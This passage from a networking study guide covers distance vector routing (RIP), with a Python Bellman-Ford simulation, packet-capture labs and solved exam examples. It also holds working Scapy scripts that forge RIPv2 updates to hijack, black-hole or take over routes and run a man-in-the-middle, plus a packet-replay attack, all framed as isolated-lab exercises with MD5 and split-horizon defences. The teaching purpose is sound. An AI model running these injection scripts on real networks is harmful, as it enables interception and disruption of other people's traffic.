# 3. The information never propagates — routers keep stale routes
# 4. Traffic gets stuck in a loop until timers expire (3-6 minutes)

# Proof of concept: drop OSPF/RIP packets using iptables (on your lab)
# WARNING: Only on your OWN isolated lab network

# Drop all RIP traffic between two specific lab routers:
sudo iptables -I FORWARD -s 192.168.56.102 -d 192.168.56.103 \
  -p udp --dport 520 -j DROP
echo "[*] RIP updates from 192.168.56.102 to 192.168.56.103 are now dropped"
echo "[*] This will cause stale routes and count-to-infinity in the network"
echo "[*] Observe routing tables diverging with: 'show ip rip' on FRRouting"

# Monitor count-to-infinity happening:
watch -n 5 "sudo vtysh -c 'show ip rip' | grep -E 'N[0-9]|metric'"
# You should see metric values incrementing: 1→2→3→...→16 (infinity)
# This simulates how routers count to infinity when convergence is disrupted

# Restore normal operation:
sudo iptables -D FORWARD -s 192.168.56.102 -d 192.168.56.103 \
  -p udp --dport 520 -j DROP
echo "[*] RIP traffic restored — network will re-converge"
```

---

### 11.2 Fake Distance Vector Injection

```bash
# ──────────────────────────────────────────────────────────────────────────
# ATTACK: Inject a Fake Distance Vector into a RIP Network
# ──────────────────────────────────────────────────────────────────────────
# In our topology model: if attacker is on the same subnet as N2,
# they can send a fake RIP UPDATE claiming they can reach N5 at cost 0.
# Routers will update their tables to route N5 traffic to the attacker.
# Result: MITM attack — all traffic to N5 flows through attacker's machine.

# Install scapy:
sudo apt install python3-scapy -y

# Fake distance vector injection simulating our topology:
sudo python3 << 'EOF'
from scapy.all import *

# We are an attacker on the N1-N2 segment (192.168.56.0/24 in our lab)
# We inject a fake RIPv2 UPDATE claiming WE can reach N5's network at cost 1
# (N5's equivalent in lab = 10.0.5.0/24, real router is at 192.168.56.105)

# This is the distance vector manipulation:
# Normal: N2 knows N5 at cost 3 (direct)
# Attack: We tell N2 we can reach N5 at cost 1 (better than the real route)
# Result: N2 updates its table — N5 traffic now flows to us

fake_dv = (
    Ether(dst="ff:ff:ff:ff:ff:ff") /
    IP(src="192.168.56.101",           # Attacker IP (Parrot OS)
       dst="224.0.0.9",                # RIPv2 multicast
       ttl=1) /
    UDP(sport=520, dport=520) /
    RIP(cmd=2, version=2) /            # RIP RESPONSE (advertisement)
    RIPEntry(
        AF=2,                          # Address Family: IP
        addr="10.0.5.0",               # N5's "subnet" in lab
        mask="255.255.255.0",
        nextHop="192.168.56.101",      # Next hop = ATTACKER (us)
        metric=1                       # Cost 1 = best possible (beats real cost 3)
    )
)

print("[ATTACKER] Sending fake distance vector advertising N5 at cost 1")
print("[ATTACKER] Real cost to N5 is 3. Our fake cost (1) is better.")
print("[ATTACKER] Routers accepting this will send N5-bound traffic to US.")
sendp(fake_dv, iface="eth0", verbose=True, count=3, inter=2)
print("[ATTACKER] Fake DV sent. Enable IP forwarding to act as MITM:")
print("  sudo sysctl net.ipv4.ip_forward=1")
print("  Then capture all traffic with: tcpdump -i eth0 -n -A")
EOF

# Enable forwarding so traffic still reaches real destination (transparent MITM):
sudo sysctl -w net.ipv4.ip_forward=1

# Capture the intercepted traffic:
sudo tcpdump -i eth0 -n -A "not port 22 and not arp" -c 30
# You should see traffic meant for N5 passing through your machine

# WHAT THIS DEMONSTRATES about DVR's weakness:
# → DVR trusts ALL distance vectors received from neighbours
# → There is NO verification of whether the advertised distances are true
# → RIPv1: zero authentication = completely open to this attack
# → RIPv2 with MD5: this attack fails (unsigned packets are rejected)

# DEFENCE: Enable RIPv2 MD5 on your FRRouting instance:
sudo vtysh << 'VTYSH'
configure terminal
key chain RIP-AUTH
 key 1
  key-string SecureRIPPassword2024!
interface eth0
 ip rip authentication mode md5
 ip rip authentication key-chain RIP-AUTH
end
write memory
VTYSH
echo "[DEFENCE] MD5 authentication enabled — fake DV packets will be rejected"
```

---

### 11.3 Replay Attack on Distance Vectors

```bash
# ──────────────────────────────────────────────────────────────────────────
# ATTACK: Replay a Captured (Stale) Distance Vector
# ──────────────────────────────────────────────────────────────────────────
# DVR (RIP) has no sequence numbers or timestamps on individual updates.
# An old captured RIP packet is still valid when replayed later.
# Attack: capture a legitimate RIP update, wait for topology to change,
# then replay the OLD update to revert routing tables to a stale state.

# STEP 1: Capture a legitimate RIP UPDATE from the network:
sudo tcpdump -i eth0 -n "udp port 520" -c 5 -w /tmp/rip_capture.pcap
echo "[*] Captured RIP packets. Waiting for topology change..."

# STEP 2: Simulate a topology change (in your lab: take down an interface)
# sudo ip link set eth1 down  (on the router VM you control)
# The network re-converges to reflect the changed topology.
sleep 60  # Wait for convergence

# STEP 3: Replay the old captured RIP update:
sudo tcpreplay --intf1=eth0 /tmp/rip_capture.pcap
echo "[*] Replayed old RIP packet — routers may revert to stale routing state"

# Verify impact:
sudo vtysh -c "show ip rip"
# Look for routes with old metric values (pre-topology-change values)
# If the replay worked: some routers now have wrong paths

# WHAT MAKES DVR VULNERABLE TO REPLAY:
# → RIPv1 and RIPv2 update packets have no per-message timestamp
# → No sequence number prevents a receiver from knowing if a packet is fresh
# → An old route entry looks identical to a new one at the protocol level
# → OSPF DOES have sequence numbers on LSAs — replay is detected and dropped

# DEFENCE:
# → RIPv2 MD5 authentication: the HMAC changes per message (includes timestamp)
#   Even if attacker replays the packet, the timestamp mismatch → rejection
# → Move to OSPF: LSAs have sequence numbers — receivers track last seen sequence
#   and reject any LSA with a sequence number ≤ the last accepted one

# Check whether your RIP implementation includes timestamp in MD5 auth:
sudo tcpdump -i eth0 "udp port 520" -v -c 3 2>/dev/null | grep -i "auth\|time\|key"
# Look for: "Authentication: MD5, Key-ID: 1, Sequence: XXXX"
# The sequence field in RIPv2 MD5 auth prevents basic replay attacks
```

---

## 12. 🧪 Practical Labs

### Lab 1 — Simulate DVR with Python (Full Working Algorithm)

```python
#!/usr/bin/env python3
# Save as: dvr_simulation.py
# Run with: python3 dvr_simulation.py
# PURPOSE: Implement and visualise the complete DVR algorithm
#          using the exact topology from the lecture (N1-N5).

INF = float('inf')

# ─── TOPOLOGY DEFINITION ─────────────────────────────────────────────────────

# Nodes in the network
NODES = ['N1', 'N2', 'N3', 'N4', 'N5']
NODE_INDEX = {n: i for i, n in enumerate(NODES)}

# Direct link costs (from topology in the lecture)
# cost[i][j] = direct link cost from node i to node j (INF if no direct link)
LINK_COSTS = {
    'N1': {'N1': 0,   'N2': 1,   'N3': INF, 'N4': INF, 'N5': INF},
    'N2': {'N1': 1,   'N2': 0,   'N3': 6,   'N4': INF, 'N5': 3  },
    'N3': {'N1': INF, 'N2': 6,   'N3': 0,   'N4': 2,   'N5': INF},
    'N4': {'N1': INF, 'N2': INF, 'N3': 2,   'N4': 0,   'N5': 4  },
    'N5': {'N1': INF, 'N2': 3,   'N3': INF, 'N4': 4,   'N5': 0  },
}

# Neighbours of each node (where it sends its distance vector)
NEIGHBOURS = {
    'N1': ['N2'],
    'N2': ['N1', 'N3', 'N5'],
    'N3': ['N2', 'N4'],
    'N4': ['N3', 'N5'],
    'N5': ['N2', 'N4'],
}

# ─── DVR DATA STRUCTURES ─────────────────────────────────────────────────────

# dist[node][destination] = best known cost from node to destination
dist = {
    node: {dest: LINK_COSTS[node][dest] for dest in NODES}
    for node in NODES
}

# next_hop[node][destination] = next hop from node to destination
next_hop = {
    node: {dest: (dest if LINK_COSTS[node][dest] != INF else None)
           for dest in NODES}
    for node in NODES
}
# Fix: if dest == node, next_hop = node (self)
for node in NODES:
    next_hop[node][node] = node

# ─── DISPLAY FUNCTIONS ───────────────────────────────────────────────────────

def print_routing_table(node, pass_num):
    print(f"\n  {node}'s Routing Table (After Pass {pass_num}):")
    print(f"  {'Destination':<14} {'Distance':<12} {'Next Hop':<10}")
    print(f"  {'─'*36}")
    for dest in NODES:
        d = dist[node][dest]
        nh = next_hop[node][dest]
        d_str = str(d) if d != INF else '∞'
        nh_str = nh if nh else '?'
        print(f"  {dest:<14} {d_str:<12} {nh_str:<10}")

def print_all_tables(pass_num):
    print(f"\n{'='*70}")
    print(f"  STATE AFTER PASS {pass_num}")
    print(f"{'='*70}")
    for node in NODES:
        print_routing_table(node, pass_num)

# ─── DVR ALGORITHM ───────────────────────────────────────────────────────────

def run_dvr_pass():
    """Run one complete pass of DVR. Returns True if any table changed."""

    # Step 1: Collect current distance vectors (what each node will share)
    # distance_vectors[node] = the distance array it will send to neighbours
    distance_vectors = {node: dict(dist[node]) for node in NODES}

    changed = False

    # Step 2: For each node, apply Bellman-Ford using received vectors
    for node in NODES:
        for dest in NODES:
            if dest == node:
                continue  # Skip self — always 0

            best_cost = INF
            best_next = None

            # Consider every neighbour as a potential next hop
            for neighbour in NEIGHBOURS[node]:
                link_cost = LINK_COSTS[node][neighbour]
                # Get neighbour's distance to destination from its distance vector
                neighbour_to_dest = distance_vectors[neighbour][dest]

                # Bellman-Ford: total cost = link to neighbour + neighbour to dest
                if link_cost != INF and neighbour_to_dest != INF:
                    total = link_cost + neighbour_to_dest
                else:
                    total = INF

                if total < best_cost:
                    best_cost = total
                    best_next = neighbour

            # Update if we found something better
            if best_cost < dist[node][dest]:
                dist[node][dest] = best_cost
                next_hop[node][dest] = best_next
                changed = True

    return changed


# ─── RUN THE SIMULATION ──────────────────────────────────────────────────────

print("="*70)
print("  DISTANCE VECTOR ROUTING SIMULATION")
print("  Topology: N1─N2─N3─N4─N5 with costs from Gate Smashers lecture")
print("="*70)

# Show initial state
print("\nINITIAL STATE (before any exchange):")
print_all_tables(0)

# Run passes until convergence
max_passes = 10
for pass_num in range(1, max_passes + 1):
    print(f"\n{'─'*70}")
    print(f"  RUNNING PASS {pass_num}...")
    print(f"{'─'*70}")

    changed = run_dvr_pass()
    print_all_tables(pass_num)

    if not changed:
        print(f"\n{'='*70}")
        print(f"  ✅ CONVERGED after {pass_num} passes — no more changes!")
        print(f"{'='*70}")
        break
    else:
        print(f"\n  → Changes detected in pass {pass_num}. Running next pass...")

# ─── FINAL SUMMARY ───────────────────────────────────────────────────────────

print("\n" + "="*70)
print("  FINAL CONVERGED ROUTING TABLES — COMPLETE SUMMARY")
print("="*70)
for source in NODES:
    print(f"\n  {source} — Optimal paths to all destinations:")
    for dest in NODES:
        d = dist[source][dest]
        nh = next_hop[source][dest]
        d_str = str(d) if d != INF else '∞'
        nh_str = nh if nh else '?'
        if source == dest:
            print(f"    {source} → {dest}: cost=0 (self)")
        else:
            print(f"    {source} → {dest}: cost={d_str}, next_hop={nh_str}")

# ─── BELLMAN-FORD EQUATION VERIFICATION ──────────────────────────────────────

print("\n" + "="*70)
print("  VERIFICATION: Bellman-Ford equation check for N5 → N3")
print("="*70)
node, dest = 'N5', 'N3'
print(f"\n  D({node}, {dest}) = min over neighbours v of [cost({node},v) + D(v,{dest})]")
for v in NEIGHBOURS[node]:
    lc = LINK_COSTS[node][v]
    vd = dist[v][dest]
    total = lc + vd if lc != INF and vd != INF else INF
    print(f"    Via {v}: cost({node},{v})={lc} + D({v},{dest})={vd} = {total}")
print(f"  Minimum = {dist[node][dest]}, via {next_hop[node][dest]}")
```

---

### Lab 2 — Capture RIP (DVR in Practice) with Wireshark

```bash
# PURPOSE: See DVR in action by capturing real RIP packets — the actual
# distance vectors being exchanged by routers on a live FRRouting network.

# Install and configure FRRouting with RIP:
sudo apt install frr frr-pythontools -y
sudo sed -i 's/ripd=no/ripd=yes/' /etc/frr/daemons

# Add loopback addresses to simulate our topology:
sudo ip addr add 10.0.1.1/24 dev lo   # Simulate N1's network
sudo ip addr add 10.0.2.1/24 dev lo   # Simulate N2's network

# Configure RIPv2:
sudo tee /etc/frr/ripd.conf << 'EOF'
hostname dvr-lab-router
log file /var/log/frr/rip.log
log syslog informational
router rip
  version 2
  network 192.168.56.0/24      ! Parrot OS interface (real link)
  network 10.0.1.0/24          ! Simulated N1 network
  network 10.0.2.0/24          ! Simulated N2 network
  timers basic 10 60 80        ! Hello=10s, Invalid=60s, Flush=80s (faster for lab)
  no passive-interface default
EOF

sudo systemctl restart frr

# Start capturing RIP distance vectors:
sudo tcpdump -i eth0 -n "udp port 520" -v -w /tmp/dvr_rip.pcap &
TCPDUMP_PID=$!

echo "[*] Waiting for RIP updates (10 seconds with lab timer settings)..."
sleep 25  # Wait for at least 2 RIP update cycles
sudo kill $TCPDUMP_PID

# Analyse with tshark:
echo ""
echo "=== RIP DISTANCE VECTORS CAPTURED ==="
tshark -r /tmp/dvr_rip.pcap -Y "rip" -T fields \
  -e frame.time_relative \
  -e ip.src \
  -e rip.version \
  -e rip.command \
  -q 2>/dev/null | head -20

# Decode each route entry in the distance vectors:
echo ""
echo "=== ROUTES IN EACH DISTANCE VECTOR ==="
tshark -r /tmp/dvr_rip.pcap -Y "rip.command == 2" \
  -T fields \
  -e ip.src \
  -e rip.ip \
  -e rip.netmask \
  -e rip.metric \
  -q 2>/dev/null

# Open in Wireshark for visual inspection:
wireshark /tmp/dvr_rip.pcap &
# In Wireshark:
# Filter: rip
# Click any packet → expand "Routing Information Protocol"
# You'll see: Command=Response (=distance vector being shared), each route entry
# This IS the distance vector in the lecture — just encoded in UDP/IP

echo ""
echo "=== INTERPRETATION ==="
echo "Each captured RIP RESPONSE packet = one distance vector exchange"
echo "The 'ip.src' = which router sent its distance vector"
echo "Each 'rip.ip' + 'rip.metric' row = one entry in the distance array"
echo "The receiving router (neighbours only) will run Bellman-Ford on this"
echo "to update their own routing tables — exactly as shown in the lecture."
```

---

### Lab 3 — Inject a Fake Distance Vector with Scapy

```python
#!/usr/bin/env python3
# Save as: dvr_inject.py
# Run with: sudo python3 dvr_inject.py
# PURPOSE: Demonstrate how a malicious router can inject a false distance
# vector to manipulate routing in a DVR/RIP network.
# ENVIRONMENT: Only run on your own isolated lab network.

from scapy.all import *
import time

print("="*70)
print("FAKE DISTANCE VECTOR INJECTION LAB")
print("Simulating the lecture topology attack scenario")
print("="*70)

TARGET_INTERFACE = "eth0"
ATTACKER_IP = "192.168.56.101"    # Parrot OS (attacker)
RIP_MULTICAST = "224.0.0.9"       # RIPv2 all-routers multicast

# ─── ATTACK SCENARIO ─────────────────────────────────────────────────────────
# Mapping lecture topology to lab:
#   N1 = 192.168.56.110   N2 = 192.168.56.102 (Metasploitable2 as N2)
#   N3 = 192.168.56.103   N4 = 192.168.56.104
#   N5 = 192.168.56.105

# In the lecture: N4→N1 optimal path is via N5, cost 8.
# ATTACK: We tell N4 that WE can reach N1 at cost 2 (much better than 8).
# N4 will update its routing table: route to N1 now goes through ATTACKER.

print("\n[*] Attack scenario:")
print("    Lecture topology: N4 → N1 optimal cost = 8 (via N5 → N2 → N1)")
print("    Fake DV claims:   N4 → N1 via attacker cost = 2 (better!)")
print("    If N4 believes this: all traffic from N4 to N1 flows to attacker")

def send_fake_dv(target_network, fake_metric, label):
    """Send a single fake RIPv2 distance vector entry."""
    pkt = (
        Ether(dst="01:00:5e:00:00:09") /  # RIPv2 multicast MAC
        IP(src=ATTACKER_IP, dst=RIP_MULTICAST, ttl=1) /
        UDP(sport=520, dport=520) /
        RIP(cmd=2, version=2) /
        RIPEntry(
            AF=2,
            addr=target_network.split('/')[0],
            mask="255.255.255.0",
            nextHop=ATTACKER_IP,          # Route traffic to our machine
            metric=fake_metric
        )
    )
    print(f"\n[ATTACKER] Sending fake DV: {target_network} metric={fake_metric} ({label})")
    sendp(pkt, iface=TARGET_INTERFACE, verbose=False)
    print(f"[ATTACKER] Sent! Routers may now route {target_network} via {ATTACKER_IP}")

# ─── ATTACK 1: CLAIM LOW COST TO N1'S NETWORK ────────────────────────────────
print("\n" + "─"*70)
print("ATTACK 1: Advertise N1's subnet at cost 2 (legitimate cost = 8)")
send_fake_dv("10.0.1.0/24", 2, "N1's network at cost 2 — fake!")
time.sleep(35)  # Wait for RIP convergence cycle

# ─── ATTACK 2: BLACKHOLE N3's NETWORK ────────────────────────────────────────
print("\n" + "─"*70)
print("ATTACK 2: Blackhole N3's subnet by advertising metric=16 (infinity)")
send_fake_dv("10.0.3.0/24", 16, "N3's network at cost 16 — black hole!")
time.sleep(5)

# ─── ATTACK 3: CLAIM TO BE THE BEST ROUTE TO EVERYWHERE ─────────────────────
print("\n" + "─"*70)
print("ATTACK 3: Advertise all networks at cost 1 (routing table takeover)")

all_networks = [
    ("10.0.1.0/24", "N1"),
    ("10.0.2.0/24", "N2"),
    ("10.0.3.0/24", "N3"),
    ("10.0.4.0/24", "N4"),
    ("10.0.5.0/24", "N5"),
]

for network, label in all_networks:
    pkt = (
        Ether(dst="01:00:5e:00:00:09") /
        IP(src=ATTACKER_IP, dst=RIP_MULTICAST, ttl=1) /
        UDP(sport=520, dport=520) /
        RIP(cmd=2, version=2) /
        RIPEntry(AF=2, addr=network.split('/')[0],
                 mask="255.255.255.0", nextHop=ATTACKER_IP, metric=1)
    )
    sendp(pkt, iface=TARGET_INTERFACE, verbose=False)
    print(f"  [SENT] {label}'s network ({network}) → metric=1 via attacker")

print("\n[ATTACKER] All networks advertised at cost 1 via us.")
print("[ATTACKER] If routers accept: ALL network traffic routes through attacker.")

# Enable IP forwarding to forward intercepted traffic (transparent MITM):
import subprocess
subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
print("\n[ATTACKER] IP forwarding enabled — acting as transparent man-in-the-middle")
print("[ATTACKER] Run: sudo tcpdump -i eth0 -n -A 'not port 22' to see intercepted traffic")

# ─── WHAT THIS SHOWS ABOUT DVR SECURITY ──────────────────────────────────────
print("\n" + "="*70)
print("KEY LESSON:")
print("  DVR/RIP trusts ALL distance vectors received from the network.")
print("  There is NO verification that advertised distances are truthful.")
print("  RIPv1: completely open — no authentication at all.")
print("  RIPv2 with MD5: this attack fails — unsigned packets are rejected.")
print("")
print("  DEFENCE: Always enable RIPv2 MD5 authentication.")
print("  BETTER:  Migrate to OSPF with MD5/IPsec — link-state is harder to poison.")
print("="*70)
```

---

### Lab 4 — Trigger Count-to-Infinity on a Live RIP Network

```bash
# PURPOSE: Directly observe the count-to-infinity problem on a real FRRouting
# network, and then demonstrate that Split Horizon prevents it.

# ── STEP 1: Set up 3-router RIP network using namespaces ─────────────────────
# Topology: N1 ──(1)── N2 ──(6)── N3
# (Simplified 3-node subset from the lecture topology)

for ns in n1 n2 n3; do sudo ip netns add $ns; done

sudo ip link add n1n2a type veth peer name n1n2b
sudo ip link add n2n3a type veth peer name n2n3b

sudo ip link set n1n2a netns n1
sudo ip link set n1n2b netns n2
sudo ip link set n2n3a netns n2
sudo ip link set n2n3b netns n3

sudo ip netns exec n1 ip addr add 10.12.0.1/30 dev n1n2a && sudo ip netns exec n1 ip link set n1n2a up && sudo ip netns exec n1 ip link set lo up
sudo ip netns exec n2 ip addr add 10.12.0.2/30 dev n1n2b && sudo ip netns exec n2 ip link set n1n2b up && sudo ip netns exec n2 ip link set lo up
sudo ip netns exec n2 ip addr add 10.23.0.1/30 dev n2n3a && sudo ip netns exec n2 ip link set n2n3a up
sudo ip netns exec n3 ip addr add 10.23.0.2/30 dev n2n3b && sudo ip netns exec n3 ip link set n2n3b up && sudo ip netns exec n3 ip link set lo up

# Add "LAN" networks:
sudo ip netns exec n1 ip addr add 172.16.1.0/24 dev lo
sudo ip netns exec n3 ip addr add 172.16.3.0/24 dev lo

echo "[*] 3-node topology ready: N1 ──(1)── N2 ──(6)── N3"

# ── STEP 2: Start RIP in each namespace (using FRR per-namespace) ─────────────
# (Simplified: use ip route to simulate RIP-learned routes for the demo)

# Simulate N1 knowing about N3 via N2 (as if RIP converged):
sudo ip netns exec n1 ip route add 172.16.3.0/24 via 10.12.0.2 metric 7
# Simulate N2 knowing about N3 directly:
sudo ip netns exec n2 ip route add 172.16.3.0/24 via 10.23.0.2 metric 6
sudo ip netns exec n2 ip route add 172.16.1.0/24 via 10.12.0.1 metric 1

echo "[*] Simulated converged routing state:"
sudo ip netns exec n1 ip route show | grep "172.16"
sudo ip netns exec n2 ip route show | grep "172.16"

# ── STEP 3: Simulate N2-N3 link failure and COUNT-TO-INFINITY ─────────────────

echo ""
echo "[*] === BREAKING N2-N3 LINK ==="
sudo ip netns exec n2 ip link set n2n3a down
echo "[*] N2-N3 link is DOWN. N3 is now unreachable via N2."

echo ""
echo "[*] Expected count-to-infinity WITHOUT split horizon:"
echo "    Round 1: N2 marks N3 as ∞. But N1 still has N3 at metric 7."
echo "    Round 2: N2 hears from N1: 'I can reach N3 at 7.' N2 thinks: 7+1=8. Updates to 8."
echo "    Round 3: N1 hears N2 at 8: 8+1=9. Updates to 9."
echo "    ... continues until both reach 16 (RIP infinity)"
echo ""
echo "    This is the COUNT-TO-INFINITY loop:"

# Simulate the counting:
n1_metric=7
n2_metric=6

echo "Pass | N1→N3 | N2→N3 | Explanation"
echo "─────────────────────────────────────────────────────"
echo "  0  |   7   |   6   | Before link failure"
echo "  1  |   7   |  ∞→8  | N2 link down, but hears N1=7: 7+1=8"

for pass in 2 3 4 5 6 7 8 9; do
    n1_metric=$((n2_metric + 1))
    n2_metric=$((n1_metric + 1))
    if [ $n1_metric -ge 16 ]; then n1_metric=16; fi
    if [ $n2_metric -ge 16 ]; then n2_metric=16; fi
    echo "  $pass  |  $n1_metric    |  $n2_metric    | Both counting up..."
    if [ $n1_metric -ge 16 ] && [ $n2_metric -ge 16 ]; then
        echo "       |  16   |  16   | INFINITY REACHED — route removed after ~3 min"
        break
    fi
done

# ── STEP 4: Demonstrate SPLIT HORIZON prevents count-to-infinity ──────────────

echo ""
echo "[*] === WITH SPLIT HORIZON ==="
echo "    N1 learned about N3 VIA N2."
echo "    Split Horizon rule: do NOT advertise a route back to where you learned it."
echo "    N1 will NOT tell N2 about N3 (because N1 learned N3 from N2)."
echo ""
echo "    When N2-N3 link breaks:"
echo "    Round 1: N2 marks N3 as ∞. Sends to N1."
echo "    Round 1: N1 DOES NOT send N3 back to N2 (split horizon!)"
echo "    Round 2: N2 gets no update about N3 from N1. N3 stays ∞."
echo "    CONVERGENCE IN 1-2 ROUNDS. No counting. ✅"

echo ""
echo "    With POISON REVERSE (stronger than split horizon):"
echo "    N1 EXPLICITLY sends N3 back to N2 with metric=16 (instead of silence)"
echo "    N2 immediately knows N3 is unreachable. Faster convergence."

# ── STEP 5: Apply the fix in FRRouting ───────────────────────────────────────

echo ""
echo "[*] Applying split horizon in FRRouting (on real FRR instance):"
cat << 'VTYSH_CONF'
  # Inside vtysh:
  configure terminal
  interface eth0
   ip rip split-horizon              <- Enables split horizon
   ! OR:
   ip rip split-horizon poisoned-reverse  <- Enables poison reverse (better)
  end
  write memory
VTYSH_CONF
echo "[*] With split horizon enabled: count-to-infinity cannot occur. ✅"
```

---

### Lab 5 — DVR vs Link State on Your Own Network

```bash
# PURPOSE: Compare DVR (RIP) and Link State (OSPF) behaviour in your lab.
# Observe convergence time after a link failure for both protocols.
# Apply lessons directly to your MERN/PERN app network security.

# ── PART A: DVR/RIP Convergence Timing ───────────────────────────────────────

# Enable RIP (already done in Lab 2):
sudo systemctl start frr

# Set up monitoring: record routing table state every second:
echo "=== STARTING RIP CONVERGENCE MONITOR ==="
sudo bash -c '
  for i in $(seq 1 120); do
    STATE=$(vtysh -c "show ip rip" 2>/dev/null | grep -c "R ")
    echo "t=${i}s RIP routes known: ${STATE}"
    sleep 1
  done
' > /tmp/rip_convergence.log &
RIP_MONITOR=$!

# Simulate link failure: remove a route:
sleep 10
sudo ip route del 10.0.2.0/24 2>/dev/null  # Remove one of the simulated routes
echo "[*] Simulated link failure at t=10s"

sleep 110
sudo kill $RIP_MONITOR 2>/dev/null

echo ""
echo "=== RIP CONVERGENCE LOG (link failed at t=10s) ==="
grep -A5 "t=10s" /tmp/rip_convergence.log | head -20
echo "..."
echo "Look for how many seconds until route count returns to normal."
echo "RIP convergence: typically 30-90 seconds (one to three update cycles)."

# ── PART B: OSPF Convergence Timing ──────────────────────────────────────────

# Disable RIP, enable OSPF:
sudo sed -i 's/ripd=yes/ripd=no/' /etc/frr/daemons
sudo sed -i 's/ospfd=no/ospfd=yes/' /etc/frr/daemons

sudo tee /etc/frr/ospfd.conf << 'EOF'
hostname dvr-vs-ospf-lab
router ospf
  ospf router-id 192.168.56.101
  network 192.168.56.0/24 area 0
  network 10.0.1.0/24 area 0
  network 10.0.2.0/24 area 0
EOF
sudo systemctl restart frr

# Monitor OSPF convergence:
echo "=== STARTING OSPF CONVERGENCE MONITOR ==="
sudo bash -c '
  for i in $(seq 1 60); do
    STATE=$(vtysh -c "show ip ospf route" 2>/dev/null | grep -c "N  ")
    echo "t=${i}s OSPF routes known: ${STATE}"
    sleep 1
  done
' > /tmp/ospf_convergence.log &
OSPF_MONITOR=$!

# Simulate link failure:
sleep 10
sudo ip link set lo:1 down 2>/dev/null || sudo ip addr del 10.0.2.1/24 dev lo 2>/dev/null
echo "[*] Simulated link failure at t=10s (OSPF)"

sleep 55
sudo kill $OSPF_MONITOR 2>/dev/null

echo ""
echo "=== OSPF CONVERGENCE LOG (link failed at t=10s) ==="
grep -A5 "t=10s" /tmp/ospf_convergence.log | head -20
echo ""
echo "=== COMPARISON ==="
echo "Protocol | Convergence Time | Why"
echo "─────────────────────────────────────────────────────────────────────"
echo "RIP (DVR)| 30-90 seconds    | Must wait for next periodic update cycle"
echo "         |                  | Count-to-infinity adds more delay"
echo "         |                  | Holddown timers (180s) delay updates"
echo "OSPF     | 3-10 seconds     | Triggered LSA flood immediately on failure"
echo "         |                  | All routers re-run Dijkstra at once"
echo "         |                  | No counting problem — no holddown needed"

# ── PART C: What This Means for Your Web Projects ────────────────────────────

echo ""
echo "=== APPLICATION TO YOUR MERN/PERN PROJECTS ==="
echo ""
echo "If your web app backend uses RIP-based routing in its network:"
echo "  → A switch failure causes 30-90 sec downtime (RIP convergence)"
echo "  → Count-to-infinity = traffic loops = your API calls timeout"
echo "  → Client sees: connection timeout, 502 Bad Gateway"
echo ""
echo "If your network uses OSPF:"
echo "  → Same failure = ~5 sec downtime"
echo "  → Your load balancer retries within that window"
echo "  → Client sees: slight slowdown at worst"
echo ""
echo "PRACTICAL TESTS for your deployed MERN/PERN apps:"

# Test 1: Check routing protocol in use on your server's network:
echo ""
echo "Test 1 — Detect routing protocol in use on your server:"
sudo tcpdump -i eth0 -n "udp port 520 or proto ospf or tcp port 179" -c 5 -q 2>/dev/null
echo "  → UDP/520 seen: RIP (DVR) in use"
echo "  → Proto 89 seen: OSPF (Link State) in use"
echo "  → TCP/179 seen: BGP (for inter-AS) in use"

# Test 2: Measure how long your API takes to recover after route change:
echo ""
echo "Test 2 — Measure API recovery time after route flap:"
cat << 'EOF'
  # On your Parrot OS / dev machine:
  # Run this while you simulate a route failure on your lab network:
  while true; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/api/health)
    echo "$(date '+%H:%M:%S') HTTP $STATUS"
    sleep 0.5
  done
  # Count the seconds of non-200 responses = your routing convergence window
EOF
```

---

## 13. Solved Examples

### Example 1 — Complete Pass 1 for N3

**Question:** Given the lecture topology, work out N3's complete routing table after Pass 1. Show all calculations.

```
N3 received:
  From N2: [1, 0, 6, ∞, 3]   (N2→N1=1, N2→N2=0, N2→N3=6, N2→N4=∞, N2→N5=3)
  From N4: [∞, ∞, 2, 0, 4]   (N4→N1=∞, N4→N2=∞, N4→N3=2, N4→N4=0, N4→N5=4)

N3's direct link costs:
  N3 → N2 = 6
  N3 → N4 = 2

Calculation (Bellman-Ford for each destination):

  DEST = N1:
    Via N2: 6 + 1 = 7
    Via N4: 2 + ∞ = ∞
    Minimum = 7, Next = N2

  DEST = N2:
    Via N2: 6 + 0 = 6
    Via N4: 2 + ∞ = ∞
    Minimum = 6, Next = N2

  DEST = N3: (self)
    Cost = 0, Next = N3

  DEST = N4:
    Via N2: 6 + ∞ = ∞
    Via N4: 2 + 0 = 2
    Minimum = 2, Next = N4

  DEST = N5:
    Via N2: 6 + 3 = 9
    Via N4: 2 + 4 = 6
    Minimum = 6, Next = N4   ← N4 is better than N2 for reaching N5

N3's NEW Routing Table (after Pass 1):
  ┌─────────────┬──────────┬──────────┐
  │ Destination │ Distance │ Next Hop │
  ├─────────────┼──────────┼──────────┤
  │ N1          │    7     │   N2     │  ← Was ∞, now 7
  │ N2          │    6     │   N2     │  ← Same (already direct)
  │ N3          │    0     │   N3     │  ← Self, unchanged
  │ N4          │    2     │   N4     │  ← Same (already direct)
  │ N5          │    6     │   N4     │  ← Was ∞, now 6 via N4
  └─────────────┴──────────┴──────────┘

NOTE: N3 to N5 goes via N4 (cost 6), NOT via N2 (cost 9).
DVR correctly discovers the cheaper path even without knowing the full topology directly.
```

---

### Example 2 — Identify Incorrect Distance Vector

**Question:** After convergence, N2 claims its distance vector is [1, 0, 6, 8, 3]. Is this correct? Justify.

```
Verify each entry in N2's claimed distance vector [1, 0, 6, 8, 3]:

  N2→N1: claimed = 1
    Direct link N2-N1 = 1. ✅ CORRECT.

  N2→N2: claimed = 0
    Self. ✅ CORRECT.

  N2→N3: claimed = 6
    Direct link N2-N3 = 6. ✅ CORRECT.
    Alternative: N2→N5→N4→N3 = 3+4+2 = 9. Direct link wins. ✅

  N2→N4: claimed = 8
    Path 1: N2→N3→N4 = 6+2 = 8
    Path 2: N2→N5→N4 = 3+4 = 7   ← CHEAPER THAN 8!
    Correct answer should be 7, not 8.
    ❌ INCORRECT — N2 has not yet learned about the N5→N4 path.

  N2→N5: claimed = 3
    Direct link N2-N5 = 3. ✅ CORRECT.

CONCLUSION:
  N2's distance vector [1, 0, 6, 8, 3] is NOT the fully converged value.
  N2→N4 should be 7 (via N5) not 8 (via N3).
  This vector represents an INTERMEDIATE PASS — N2 knows N3→N4 (cost 8)
  but has not yet updated with the cheaper N5→N4 path.
  After one more pass where N5 shares its updated vector (N5→N4=4),
  N2 will recalculate: N2→N5(3) + N5→N4(4) = 7. ✅
```

---

### Example 3 — 5-Mark Exam: Explain DVR Methodology

